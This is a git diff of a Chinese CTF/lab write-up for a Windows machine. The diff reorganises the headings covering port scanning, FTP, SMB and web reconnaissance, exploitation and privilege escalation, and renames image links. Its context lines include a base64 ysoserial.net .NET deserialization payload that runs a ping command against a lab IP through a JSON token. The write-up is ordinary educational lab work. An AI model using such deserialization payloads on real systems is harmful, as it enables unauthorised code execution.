@@ -4,7 +4,9 @@ pagination_prev: null
 pagination_next: null
 ---
 
-# 端口扫描
+## 信息收集
+
+### 端口扫描
 ### 全端口扫描
 
 ~~~bash
@@ -186,7 +188,7 @@ Nmap done: 1 IP address (1 host up) scanned in 23.95 seconds
 
 ~~~
 
-# 21(ftp)
+### FTP 信息收集
 拒绝匿名登陆
 ~~~
 ┌──(kali㉿kali)-[~/json]
@@ -205,7 +207,7 @@ ftp> quit
 221 Goodbye
 ~~~
 
-# 134/445(smb)
+### SMB 信息收集
 拒绝连接
 ~~~
 ┌──(kali㉿kali)-[~/json]
@@ -216,23 +218,23 @@ session setup failed: NT_STATUS_ACCESS_DENIED
 ~~~
 
 
-# 80(web)
+### Web 信息收集
 进入主页一闪而过这个界面
 
-![](Pasted%20image%2020241125165110.png)
+![](Pasted_image_20241125165110.png)
 
 然后是一个登录框
 
-![](Pasted%20image%2020241125165136.png)
+![](Pasted_image_20241125165136.png)
 
 js文件可能有问题
 发现了一处被混淆的js代码
 
-![](Pasted%20image%2020241125165502.png)
+![](Pasted_image_20241125165502.png)
 
 找一个[美化网站](https://beautifier.io/)美化一下
 
-![](Pasted%20image%2020241125190134.png)
+![](Pasted_image_20241125190134.png)
 
 美化后的代码如下，但似乎没什么变化
 
@@ -377,7 +379,7 @@ angular.module("principalController", ["ngCookies"])
 
 先试一下登录
 
-![](Pasted%20image%2020241125192439.png)
+![](Pasted_image_20241125192439.png)
 
 得到了一个token
 token似乎是是base64编码的json
@@ -390,7 +392,11 @@ token似乎是是base64编码的json
 
 带上token再去请求/api/account
 
-![](Pasted%20image%2020241125193254.png)
+![](Pasted_image_20241125193254.png)
+
+## 漏洞利用
+
+### .NET 反序列化 (Yspserial)
 
 试试输入一些脏数据
 
@@ -403,11 +409,11 @@ e0lkOjEsVXNlck5hbWU6YWRtaW4sUGFzc3dvcmQ6MjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFm
 
 再次发送，发现我们的token似乎被序列化了
 
-![](Pasted%20image%2020241125193734.png)
+![](Pasted_image_20241125193734.png)
 
 google如何利用反序列化
 
-![](Pasted%20image%2020241125194954.png)
+![](Pasted_image_20241125194954.png)
 
 发现了[这个库](https://github.com/pwntester/ysoserial.net)
 
@@ -418,7 +424,7 @@ PS C:\Users\lizis\Desktop\ysoserial-1dba9c4416ba6e79b6b262b758fa75e2ee9008e9\Rel
 ew0KICAgICckdHlwZSc6J1N5c3RlbS5XaW5kb3dzLkRhdGEuT2JqZWN0RGF0YVByb3ZpZGVyLCBQcmVzZW50YXRpb25GcmFtZXdvcmssIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1JywgDQogICAgJ01ldGhvZE5hbWUnOidTdGFydCcsDQogICAgJ01ldGhvZFBhcmFtZXRlcnMnOnsNCiAgICAgICAgJyR0eXBlJzonU3lzdGVtLkNvbGxlY3Rpb25zLkFycmF5TGlzdCwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5JywNCiAgICAgICAgJyR2YWx1ZXMnOlsnY21kJywgJy9jIHBpbmcgLWMgNSAxMC4xMC4xNi4xMCddDQogICAgfSwNCiAgICAnT2JqZWN0SW5zdGFuY2UnOnsnJHR5cGUnOidTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcywgU3lzdGVtLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OSd9DQp9
 ~~~
 
-![](Pasted%20image%2020241125205654.png)
+![](Pasted_image_20241125205654.png)
 
 收到回应
 
@@ -525,7 +531,7 @@ type user.txt
 
 ~~~
 
-# 提权
+## 权限提升
 查看系统信息，发现hotfix没有开，并且版本较老
 
 ~~~
